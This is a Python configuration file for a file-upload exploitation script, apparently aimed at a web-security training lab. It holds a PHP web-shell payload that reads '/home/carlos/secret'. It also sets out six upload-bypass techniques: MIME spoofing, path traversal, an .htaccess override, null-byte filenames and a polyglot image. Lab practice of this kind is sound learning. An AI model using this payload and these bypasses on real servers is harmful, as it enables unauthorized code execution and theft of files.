from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "data"
OUTPUT_DIR = BASE_DIR / "output"

TARGET = ""

SESSION_COOKIE = "session="
PROMPT_FOR_SESSION_COOKIE = True

TIMEOUT = 15
VERIFY_TLS = True
FOLLOW_REDIRECTS = True
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151 Safari/537.36"

ACCOUNT_URL = "/my-account"
UPLOAD_URL = "/my-account/avatar"
UPLOAD_FILE_FIELD = "avatar"
UPLOAD_USER_FIELD = "user"
UPLOAD_CSRF_FIELD = "csrf"
UPLOAD_USERNAME = "wiener"
VERIFY_BASE_URL = "/files/avatars/"
VERIFY_URL = None

SECRET_PATH = "/home/carlos/secret"

# Constructed at runtime so the exact marker is not present in PHP source.
SUCCESS_MARKER = "START"
END_MARKER = "END"
PHP_PAYLOAD = f"""<?php
echo "START_" . "FLAG";
echo file_get_contents('{SECRET_PATH}');
echo "END_" . "FLAG";
?>"""

# Technique 1
DIRECT_FILENAME = "challenge_shell.php"
DIRECT_CONTENT_TYPE = "application/octet-stream"
DIRECT_VERIFY_URL = "/files/avatars/challenge_shell.php"

# Technique 2
MIME_FILENAME = "challenge_shell.php"
MIME_CONTENT_TYPE = "image/jpeg"
MIME_VERIFY_URL = "/files/avatars/challenge_shell.php"

# Technique 3
TRAVERSAL_FILENAME = DIRECT_FILENAME
TRAVERSAL_WIRE_PREFIX = "..%2f"
TRAVERSAL_CONTENT_TYPE = "application/octet-stream"
TRAVERSAL_VERIFY_BASE_URL = "/files/"
TRAVERSAL_VERIFY_URL = None

# Technique 4
HTACCESS_FILE = DATA_DIR / "htaccess.txt"
HTACCESS_FILENAME = ".htaccess"
HTACCESS_SHELL_PREFIX = "challenge_shell"
HTACCESS_VERIFY_URL = None

# Technique 5
NULLBYTE_FILE = DATA_DIR / "nullbyte_names.txt"
NULLBYTE_CONTENT_TYPE = "application/octet-stream"
NULLBYTE_VERIFY_BASE_URL = VERIFY_BASE_URL

# Technique 6: pre-built polyglot, uploaded as-is.
# The script does NOT run ExifTool and does NOT generate the polyglot.
POLYGLOT_FILE = DATA_DIR / "polyglot_jpg.php"
POLYGLOT_FILENAME = "polyglot_jpg.php"
POLYGLOT_CONTENT_TYPE = "application/octet-stream"
POLYGLOT_VERIFY_URL = "/files/avatars/polyglot_jpg.php"

STRATEGY_ORDER = ["direct", "mime", "traversal", "htaccess", "nullbyte", "polyglot"]
STOP_ON_SUCCESS = True
CONTINUE_AFTER_UPLOAD_ERROR = True
SHOW_RESPONSE_SNIPPET = False
VERBOSE = True
LOG_FILE = OUTPUT_DIR / "run.log"
